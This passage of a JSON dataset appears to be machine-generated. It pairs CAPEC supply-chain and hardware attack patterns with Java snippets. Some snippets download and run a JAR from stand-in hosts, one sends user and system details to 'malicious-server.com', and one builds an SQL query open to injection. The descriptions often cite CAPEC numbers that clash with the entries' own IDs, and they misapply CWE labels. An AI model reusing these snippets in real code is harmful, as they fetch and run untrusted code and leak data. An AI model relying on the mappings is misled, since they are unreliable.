        "code_snippet": "import java.io.*;\n\npublic class MaliciousIDEInfiltration {\n    public static void main(String[] args) {\n        try {\n            // CWE-434: Unrestricted upload of a dangerous file type\n            File maliciousFile = new File(\"/path/to/malicious/file.jar\");\n            if (maliciousFile.exists()) {\n                // CWE-506: Embedded malicious code\n                ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", maliciousFile.getAbsolutePath());\n                Process p = pb.start();\n\n                // CWE-497: Exposure of sensitive system information\n                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line); // CWE-200: Exposure of sensitive information\n                }\n\n                // CWE-215: Insertion of sensitive information into debugging code\n                System.out.println(\"Debug: Malicious file executed successfully.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker infiltrates an IDE environment by uploading a malicious JAR file (CWE-434). The code then executes this file (CWE-506), potentially allowing the attacker to gain control over the environment. During execution, the code reads and prints sensitive system information (CWE-497, CWE-200), which could be exfiltrated by the attacker. Additionally, sensitive information is inserted into debugging output (CWE-215), which could be exposed if debugging is not disabled in production. This snippet embodies the main idea of CAPEC-117, illustrating how an attacker can infiltrate a software development environment to manipulate and exfiltrate sensitive data."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class HardwareComponentSubstitution {\n    private static final Map<String, String> baselineComponents = new HashMap<>();\n    private static final Map<String, String> deployedComponents = new HashMap<>();\n\n    static {\n        // Baseline components\n        baselineComponents.put(\"CPU\", \"TrustedCPU\");\n        baselineComponents.put(\"Memory\", \"TrustedMemory\");\n        baselineComponents.put(\"Storage\", \"TrustedStorage\");\n    }\n\n    public static void main(String[] args) {\n        // Simulate substitution of a malicious component during development\n        substituteComponent(\"CPU\", \"MaliciousCPU\");\n\n        // Simulate deployment with substituted components\n        deployComponents();\n\n        // Check if the deployed components match the baseline\n        if (!baselineComponents.equals(deployedComponents)) {\n            System.out.println(\"Warning: Deployed components do not match baseline components!\");\n        }\n    }\n\n    private static void substituteComponent(String component, String maliciousComponent) {\n        // Simulate the substitution of a malicious component\n        deployedComponents.put(component, maliciousComponent);\n    }\n\n    private static void deployComponents() {\n        // Simulate deployment of components\n        for (Map.Entry<String, String> entry : baselineComponents.entrySet()) {\n            deployedComponents.putIfAbsent(entry.getKey(), entry.getValue());\n        }\n    }\n}",
        "description": "This Java code snippet simulates the substitution of a malicious hardware component during the development phase, which is the main idea of the CAPEC 'Hardware Component Substitution During Baselining'. The code defines a set of baseline components and then simulates the substitution of a 'CPU' component with a 'MaliciousCPU' during development. During deployment, it checks if the deployed components match the baseline components. If they do not match, it prints a warning message. This represents the risk of relying on vulnerable or untrustworthy components (CWE-1395, CWE-1357) and the potential for malicious alterations that could compromise the final product."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class DocumentationAlteration {\n    private static final String DOCUMENT_PATH = \"path/to/documentation.txt\";\n    private static final String ALTERED_DOCUMENT_PATH = \"path/to/altered_documentation.txt\";\n\n    public static void main(String[] args) {\n        try {\n            // Read the original documentation\n            String content = new String(Files.readAllBytes(Paths.get(DOCUMENT_PATH)));\n\n            // Alter the documentation to circumvent dial-down functionality\n            String alteredContent = content.replace(\"restricted_technology\", \"allowed_technology\");\n\n            // Write the altered documentation to a new file\n            FileWriter writer = new FileWriter(new File(ALTERED_DOCUMENT_PATH));\n            writer.write(alteredContent);\n            writer.close();\n\n            System.out.println(\"Documentation altered successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Documentation Alteration to Circumvent Dial-down' by reading a manufacturer's documentation, altering it to change the interpretation of restricted technology, and writing the altered content to a new file. The code embodies CWE-1263 (Improper Physical Access Control) by assuming the attacker has access to the documentation, CWE-1059 (Insufficient Technical Documentation) by modifying the documentation, CWE-695 (Use of Low-Level Functionality) by directly manipulating file content, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing restricted technology. The code does not handle security measures, making it vulnerable to misuse."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "import java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SystemConfiguration {\n    private Properties properties = new Properties();\n\n    public void loadConfiguration(String filePath) throws IOException {\n        FileInputStream fis = new FileInputStream(filePath);\n        properties.load(fis);\n        fis.close();\n    }\n\n    public String getSystemCapability(String key) {\n        return properties.getProperty(key);\n    }\n\n    public static void main(String[] args) {\n        SystemConfiguration config = new SystemConfiguration();\n        try {\n            config.loadConfiguration(\"system_config.properties\");\n            String capability = config.getSystemCapability(\"max_connections\");\n            System.out.println(\"Max Connections: \" + capability);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to the CAPEC 'Documentation Alteration to Produce Under-performing Systems'. The code loads system configuration from a properties file and retrieves a specific system capability ('max_connections'). If an attacker gains access to the 'system_config.properties' file and alters the 'max_connections' value, it could lead to under-performing systems. This example also touches on related CWEs: insufficient technical documentation (CWE-1059) as the properties file may lack proper documentation, exposure of sensitive system information (CWE-497) if the properties file is not properly secured, and improper following of specification (CWE-573) if the system does not validate the configuration values properly."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "public class VulnerableSystem {\n    // Insufficient Technical Documentation\n    // Missing Documentation for Design\n    private int importantValue;\n\n    public VulnerableSystem() {\n        // Incorrect Provision of Specified Functionality\n        // No documentation on why this value is set to 42\n        this.importantValue = 42;\n    }\n\n    public void setImportantValue(int value) {\n        // Improper Control of Dynamically-Managed Code Resources\n        // No validation or control over the input value\n        this.importantValue = value;\n    }\n\n    public int getImportantValue() {\n        return this.importantValue;\n    }\n\n    public static void main(String[] args) {\n        VulnerableSystem vs = new VulnerableSystem();\n        // Improper Following of Specification by Caller\n        // No specification on valid range for importantValue\n        vs.setImportantValue(100);\n        System.out.println(\"Important Value: \" + vs.getImportantValue());\n    }\n}",
        "description": "This Java code snippet represents a vulnerable system where an attacker could exploit insufficient and missing documentation to cause errors in system design. The class `VulnerableSystem` lacks proper technical and design documentation, making it unclear why `importantValue` is initialized to 42. The `setImportantValue` method does not validate the input, allowing any value to be set, which could lead to improper control of dynamically-managed code resources. The `main` method demonstrates improper following of specifications by setting `importantValue` to 100 without any validation or documentation on the valid range. This code embodies the main idea of the CAPEC by showing how insufficient and missing documentation can lead to exploitable weaknesses in the system."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "public class Main {\n    public static void main(String[] args) {\n        // Simulate the use of a counterfeit hardware component\n        HardwareComponent component = new CounterfeitComponent();\n        component.performOperation();\n    }\n}\n\nclass HardwareComponent {\n    public void performOperation() {\n        System.out.println(\"Performing safe operation...\");\n    }\n}\n\nclass CounterfeitComponent extends HardwareComponent {\n    @Override\n    public void performOperation() {\n        // Malicious behavior embedded in counterfeit component\n        System.out.println(\"Performing malicious operation...\");\n        // Undocumented feature that can be exploited\n        undocumentedFeature();\n    }\n\n    private void undocumentedFeature() {\n        System.out.println(\"Executing undocumented feature...\");\n        // Potentially harmful code\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of a counterfeit hardware component being inserted during product assembly. The `Main` class uses a `HardwareComponent`, but instead of a legitimate component, a `CounterfeitComponent` is used. The `CounterfeitComponent` overrides the `performOperation` method to include malicious behavior and an undocumented feature, representing CWE-506 (Embedded Malicious Code) and CWE-1242 (Inclusion of Undocumented Features or Chicken Bits). This counterfeit component could be seen as relying on an insufficiently trustworthy component (CWE-1357) and potentially having known vulnerabilities (CWE-1395). The observable discrepancy in behavior (CWE-207) is shown by the different output when the counterfeit component is used."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "public class HardwareConfig {\n    private int registerDefault = 0x00; // CWE-1221: Incorrect Register Defaults\n    private boolean lockBit = false; // CWE-1231: Improper Prevention of Lock Bit Modification\n\n    public void setRegisterDefault(int value) {\n        // CWE-657: Violation of Secure Design Principles\n        // No validation or security checks\n        this.registerDefault = value;\n    }\n\n    public void setLockBit(boolean value) {\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        this.lockBit = value;\n    }\n\n    public void debug() {\n        // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n        System.out.println(\"Debugging: Register Default = \" + registerDefault + \", Lock Bit = \" + lockBit);\n    }\n\n    public static void main(String[] args) {\n        HardwareConfig config = new HardwareConfig();\n        config.setRegisterDefault(0xFF); // Setting insecure default\n        config.setLockBit(true); // Lock bit can be modified\n        config.debug(); // Debugging without proper granularity\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a hardware configuration class that embodies the main idea of the CAPEC 'Hardware Design Specifications Are Altered'. The class contains vulnerabilities related to the CWEs mentioned. The 'registerDefault' is set to an insecure value (CWE-1221), and the 'lockBit' can be modified after being set (CWE-1231). The 'setRegisterDefault' method lacks validation, violating secure design principles (CWE-657). The 'debug' method demonstrates incorrect chaining or granularity of debug components (CWE-1296). This code illustrates how altering hardware design specifications can introduce security flaws advantageous to an attacker."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "public class MaliciousHardwareComponent {\n    private static final String HARDWARE_ID = \"1234-5678-ABCD-EFGH\"; // CWE-1329: Non-updateable component\n    private static final String MALICIOUS_CODE = \"System.exit(1);\"; // CWE-506: Embedded malicious code\n\n    public static void main(String[] args) {\n        if (isHardwareTampered()) { // CWE-1357: Insufficiently trustworthy component\n            injectMaliciousCode();\n        }\n    }\n\n    private static boolean isHardwareTampered() {\n        // Simulate checking hardware ID against a trusted list\n        String currentHardwareId = getHardwareId();\n        return !HARDWARE_ID.equals(currentHardwareId); // CWE-1395: Dependency on vulnerable third-party component\n    }\n\n    private static String getHardwareId() {\n        // Simulate fetching hardware ID from the system\n        return \"1234-5678-ABCD-EFGH\"; // This would be replaced by the tampered hardware ID\n    }\n\n    private static void injectMaliciousCode() {\n        // CWE-1334: Unauthorized error injection\n        System.out.println(\"Injecting malicious code...\");\n        eval(MALICIOUS_CODE); // Simulate executing malicious code\n    }\n\n    private static void eval(String code) {\n        // Simulate code execution\n        System.out.println(\"Executing: \" + code);\n    }\n}",
        "description": "This Java code snippet simulates a scenario where a malicious hardware component is introduced into a system. The `isHardwareTampered` method checks if the current hardware ID matches a trusted ID, representing a reliance on a non-updateable component (CWE-1329) and dependency on a vulnerable third-party component (CWE-1395). If the hardware is tampered, the `injectMaliciousCode` method is called, which simulates the execution of embedded malicious code (CWE-506) and unauthorized error injection (CWE-1334). The code demonstrates the main idea of CAPEC-452, where an adversary replaces legitimate hardware with tampered hardware to cause disruption or further compromise the system."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousSoftware {\n    public static void main(String[] args) {\n        try {\n            // CWE-1395: Dependency on Vulnerable Third-Party Component\n            URL url = new URL(\"http://example.com/vulnerable-component.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"vulnerable-component.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"java -jar vulnerable-component.jar\");\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            replicateMaliciousCode();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void replicateMaliciousCode() {\n        try {\n            // Simulate replication by copying itself to another location\n            File source = new File(\"MaliciousSoftware.class\");\n            File dest = new File(\"/tmp/MaliciousSoftware.class\");\n            InputStream in = new FileInputStream(source);\n            OutputStream out = new FileOutputStream(dest);\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Malicious Software Implanted' in a supply chain distribution channel. The code first downloads a vulnerable third-party component (CWE-1395) from a URL and saves it locally. It then executes this component, which could contain embedded malicious code (CWE-506). Additionally, the code includes a method to replicate itself to another location, simulating the behavior of a virus or worm (CWE-509). This snippet embodies the idea of implanting malicious software that can cause disruption or further compromise the system when deployed."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class RogueIntegration {\n    public static void main(String[] args) {\n        String url = \"jdbc:mysql://localhost:3306/mydatabase\";\n        String user = \"root\";\n        String password = \"password\";\n        String query = \"SELECT * FROM users WHERE username='\" + args[0] + \"'\";\n\n        try {\n            // Establishing a connection to the database\n            Connection conn = DriverManager.getConnection(url, user, password);\n            Statement stmt = conn.createStatement();\n\n            // Executing the query\n            ResultSet rs = stmt.executeQuery(query);\n\n            // Processing the result set\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n\n            // Closing the connection\n            conn.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Maliciously altered component\n    public static void maliciousComponent() {\n        // This method represents a rogue process that could be inserted into the system\n        System.out.println(\"Executing malicious component...\");\n        // Potentially harmful operations\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker could insert a malicious component into a system, aligning with the CAPEC 'Rogue Integration Procedures'. The code includes a SQL query that is vulnerable to SQL Injection (CWE-89) due to improper neutralization of user input. Additionally, the 'maliciousComponent' method represents an embedded malicious code (CWE-506) that could be executed as part of the rogue integration. The code also highlights the inclusion of functionality from an untrusted control sphere (CWE-829) by potentially executing harmful operations within the 'maliciousComponent' method. This snippet encapsulates the idea of an attacker altering or establishing rogue processes to insert malicious components into a system, leading to potential disruption or compromise when deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\nimport java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\nimport java.io.StringReader;\n\npublic class XMLFloodExample {\n    public static void main(String[] args) {\n        String xmlData = \"<root>\";\n        for (int i = 0; i < 100000; i++) {\n            xmlData += \"<element>data</element>\";\n        }\n        xmlData += \"</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            builder.parse(new InputSource(new StringReader(xmlData)));\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a potential XML Flood attack. The code constructs a large XML document by repeatedly appending the same XML element in a loop, creating a very large XML payload. The DocumentBuilderFactory and DocumentBuilder classes are then used to parse this large XML document. This can lead to a Denial of Service (DoS) as the system may become overwhelmed by the large number of XML elements, causing it to become unstable, freeze, or crash. This example highlights the vulnerability described in CAPEC-230 (XML Flood) and related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-112 (Missing XML Validation)."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class MalwareRecon {\n    public static void main(String[] args) {\n        try {\n            // Simulate malware behavior by gathering system information\n            String os = System.getProperty(\"os.name\");\n            String user = System.getProperty(\"user.name\");\n            String javaVersion = System.getProperty(\"java.version\");\n\n            // Send gathered information to an external server\n            String targetURL = \"http://malicious-server.com/collect?os=\" + os + \"&user=\" + user + \"&javaVersion=\" + javaVersion;\n            URL url = new URL(targetURL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            // Print the response from the server (for debugging purposes)\n            System.out.println(response.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates malware behavior by gathering sensitive system information such as the operating system name, user name, and Java version. It then sends this information to an external server, representing a common tactic used in malware-directed internal reconnaissance. This code embodies the CAPEC concept by demonstrating how malware can collect and exfiltrate sensitive information. The code also touches on related CWEs: it exposes sensitive system information (CWE-497), contains potentially malicious code (CWE-506), and could be part of a larger spyware or virus (CWE-512, CWE-509)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ComponentManager {\n    private Map<String, String> components = new HashMap<>();\n\n    public void addComponent(String name, String version) {\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        if (isVulnerableComponent(name, version)) {\n            System.out.println(\"Warning: Adding a vulnerable component!\");\n        }\n        components.put(name, version);\n    }\n\n    public void integrateComponent(String name) {\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        if (!isTrustedComponent(name)) {\n            System.out.println(\"Error: Attempting to integrate an untrusted component!\");\n            return;\n        }\n        // CWE-506: Embedded Malicious Code\n        if (containsMaliciousCode(name)) {\n            System.out.println(\"Error: Component contains malicious code!\");\n            return;\n        }\n        System.out.println(\"Component \" + name + \" integrated successfully.\");\n    }\n\n    private boolean isVulnerableComponent(String name, String version) {\n        // Simulate a check for known vulnerabilities\n        return \"vulnerable-lib\".equals(name) && \"1.0\".equals(version);\n    }\n\n    private boolean isTrustedComponent(String name) {\n        // Simulate a trust check\n        return !\"untrusted-lib\".equals(name);\n    }\n\n    private boolean containsMaliciousCode(String name) {\n        // Simulate a check for malicious code\n        return \"malicious-lib\".equals(name);\n    }\n\n    public static void main(String[] args) {\n        ComponentManager manager = new ComponentManager();\n        manager.addComponent(\"vulnerable-lib\", \"1.0\");\n        manager.integrateComponent(\"untrusted-lib\");\n        manager.integrateComponent(\"malicious-lib\");\n        manager.integrateComponent(\"trusted-lib\");\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a component management system that embodies the main idea of CAPEC-453: 'Provide Counterfeit Component'. The code includes checks for vulnerabilities (CWE-1395), trustworthiness (CWE-1357), and malicious code (CWE-506) when adding and integrating components. The `addComponent` method warns if a vulnerable component is added, while the `integrateComponent` method prevents the integration of untrusted or malicious components. This demonstrates how an attacker could exploit the procurement process by introducing counterfeit components that could disrupt or compromise the system."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "public class HardwareComponent {\n    private boolean isUpdateable;\n    private boolean isMalicious;\n    private String componentName;\n\n    public HardwareComponent(String componentName, boolean isUpdateable, boolean isMalicious) {\n        this.componentName = componentName;\n        this.isUpdateable = isUpdateable;\n        this.isMalicious = isMalicious;\n    }\n\n    public void performOperation() {\n        if (isMalicious) {\n            injectMaliciousCode();\n        } else {\n            System.out.println(componentName + \" is performing its operation.\");\n        }\n    }\n\n    private void injectMaliciousCode() {\n        System.out.println(\"Malicious code injected by \" + componentName);\n        // Simulate error injection to degrade hardware redundancy\n        System.out.println(\"Error injected to degrade hardware redundancy.\");\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent approvedComponent = new HardwareComponent(\"ApprovedComponent\", true, false);\n        HardwareComponent maliciousComponent = new HardwareComponent(\"MaliciousComponent\", false, true);\n\n        // Simulate substitution of hardware component\n        HardwareComponent currentComponent = maliciousComponent; // Substitution happens here\n\n        currentComponent.performOperation();\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Hardware Component Substitution' where an attacker replaces an approved hardware component with a malicious one. The `HardwareComponent` class has attributes to indicate if the component is updateable and if it is malicious. The `performOperation` method checks if the component is malicious and injects malicious code if true, simulating error injection to degrade hardware redundancy. The `main` method demonstrates the substitution of an approved component with a malicious one, embodying the main idea of the CAPEC. The code also touches on related CWEs such as reliance on non-updateable components, improper restriction of hardware features, and embedded malicious code."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MaliciousBIOSUpdater {\n    private static final String BIOS_FILE_PATH = \"/path/to/bios.bin\";\n    private static final byte[] MALICIOUS_CODE = {0x00, 0x01, 0x02, 0x03}; // Example malicious payload\n\n    public static void main(String[] args) {\n        try {\n            updateBIOS(BIOS_FILE_PATH, MALICIOUS_CODE);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void updateBIOS(String filePath, byte[] payload) throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(filePath)) {\n            fos.write(payload);\n            System.out.println(\"BIOS updated with malicious code.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simplified version of an attack where a maliciously altered BIOS is written to a system. The `MaliciousBIOSUpdater` class contains a method `updateBIOS` that writes a malicious payload to a specified BIOS file path. This represents the CAPEC 'Altered Installed BIOS' where an attacker with access to update system software sends a malicious BIOS to the victim. The code also touches on related CWEs: it assumes the BIOS is not updateable (CWE-1277), lacks granular access control (CWE-1220), contains embedded malicious code (CWE-506), does not prevent lock bit modification (CWE-1231), and relies on a non-updateable component (CWE-1329). The code is a simplified example and does not include actual malicious payloads or real BIOS update mechanisms."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker introduces malicious code to a victim's system by altering the payload of a software update. The code downloads an executable JAR file from a remote location without verifying its integrity (CWE-494: Download of Code Without Integrity Check). After downloading, it executes the JAR file, which could contain embedded malicious code (CWE-506: Embedded Malicious Code). This represents the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker can compromise a system by tricking the user into downloading and running a malicious update."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "public class HardwareUpdate {\n    private static final String FIRMWARE_VERSION = \"1.0.0\";\n    private static boolean isFirmwareUpdateable = false;\n\n    public static void main(String[] args) {\n        if (!isFirmwareUpdateable) {\n            System.out.println(\"Firmware cannot be updated. Potential vulnerability present.\");\n        }\n\n        // Simulate hardware replacement\n        HardwareComponent component = new HardwareComponent(\"GoodComponent\");\n        System.out.println(\"Original component: \" + component.getName());\n\n        // Malicious update\n        component = new HardwareComponent(\"MaliciousComponent\");\n        System.out.println(\"Updated component: \" + component.getName());\n\n        // Simulate embedded malicious code\n        if (component.getName().equals(\"MaliciousComponent\")) {\n            System.out.println(\"Warning: Malicious component detected!\");\n            // Potentially perform malicious actions\n        }\n    }\n}\n\nclass HardwareComponent {\n    private String name;\n\n    public HardwareComponent(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n}",
        "description": "This Java code snippet simulates a scenario where a hardware component is replaced with a malicious one during an update procedure. The code first checks if the firmware is updateable, highlighting a potential vulnerability if it is not. It then simulates the replacement of a good hardware component with a malicious one. The presence of the malicious component is detected, and a warning is printed. This represents the CAPEC of 'Malicious Hardware Update' by showing how an adversary can introduce a malicious component during an update, leveraging the inability to update firmware (CWE-1277) and embedding malicious code (CWE-506)."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "public class MaliciousHardware {\n    private static final String MALICIOUS_CODE = \"System.out.println('Malicious code executed');\";\n    private static final String HARDWARE_ID = \"1234-5678-ABCD-EFGH\";\n\n    public static void main(String[] args) {\n        if (isGrayMarketHardware(HARDWARE_ID)) {\n            executeMaliciousCode();\n        } else {\n            System.out.println(\"Hardware is safe.\");\n        }\n    }\n\n    private static boolean isGrayMarketHardware(String hardwareId) {\n        // Simulate checking hardware ID against a list of known gray market IDs\n        return \"1234-5678-ABCD-EFGH\".equals(hardwareId);\n    }\n\n    private static void executeMaliciousCode() {\n        // Simulate executing malicious code embedded in the hardware\n        System.out.println(\"Executing malicious code...\");\n        eval(MALICIOUS_CODE);\n    }\n\n    private static void eval(String code) {\n        // Simulate a vulnerable method that executes arbitrary code\n        System.out.println(code);\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Malicious Gray Market Hardware' by simulating a scenario where hardware components sold on the gray market contain embedded malicious code. The `isGrayMarketHardware` method checks if the hardware ID matches a known gray market ID. If it does, the `executeMaliciousCode` method is called, which simulates the execution of malicious code. This code snippet embodies the CWE-506 (Embedded Malicious Code) by including a string that represents malicious code and a method to execute it. It also touches on CWE-1329 (Reliance on Component That is Not Updateable) and CWE-1357 (Reliance on Insufficiently Trustworthy Component) by implying that the hardware component is not trustworthy and cannot be updated to remove the malicious code."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class ConfigInjector {\n    public static void main(String[] args) {\n        String configFilePath = \"/path/to/config/file\";\n        String tempFilePath = \"/path/to/temp/file\";\n\n        try {\n            // Read the original configuration file\n            String configData = new String(Files.readAllBytes(Paths.get(configFilePath)));\n\n            // Simulate an attacker injecting malicious data\n            String maliciousData = \"malicious_setting=true\";\n            configData += \"\\n\" + maliciousData;\n\n            // Write the modified configuration to a temporary file\n            Files.write(Paths.get(tempFilePath), configData.getBytes());\n\n            // Replace the original configuration file with the modified one\n            Files.move(Paths.get(tempFilePath), Paths.get(configFilePath), StandardCopyOption.REPLACE_EXISTING);\n\n            System.out.println(\"Configuration file updated with malicious data.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker injects malicious data into a configuration file during the system's configuration or recalibration phase. The code reads the original configuration file, appends a malicious setting, writes the modified configuration to a temporary file, and then replaces the original configuration file with the modified one. This embodies the CAPEC 'Data Injected During Configuration' by showing how an attacker can manipulate critical operational data. The code also touches on related CWEs such as 'Improper Access Control' (CWE-284) by not restricting access to the configuration file, 'Insecure Temporary File' (CWE-377) by using a temporary file insecurely, and 'Improper Control of Resource Identifiers' (CWE-99) by not validating the input data properly."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class MaliciousFirmwareUpdater {\n    public static void main(String[] args) {\n        try {\n            // CWE-506: Embedded Malicious Code\n            File firmwareFile = new File(\"/path/to/firmware.bin\");\n            if (firmwareFile.exists()) {\n                // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n                String sensitiveInfo = \"Sensitive System Information\";\n                System.out.println(\"Exposing sensitive info: \" + sensitiveInfo);\n\n                // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n                FileWriter writer = new FileWriter(firmwareFile, true);\n                writer.write(\"\\n// Malicious code injected\\n\");\n                writer.write(\"System.out.println(\\\"Malicious code executed\\\");\");\n                writer.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents the infiltration of a hardware development environment by embedding malicious code into a firmware file. The code checks if a firmware file exists and then appends malicious code to it. It also demonstrates the exposure of sensitive system information and the lack of protection for confidential information on the device. The code embodies the main idea of CAPEC-171 by showing how an adversary can manipulate the development environment to insert malicious software, potentially leading to further compromise or disruption. The related CWEs are illustrated through the embedded malicious code (CWE-506), exposure of sensitive information (CWE-497), and unprotected confidential information (CWE-1297)."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
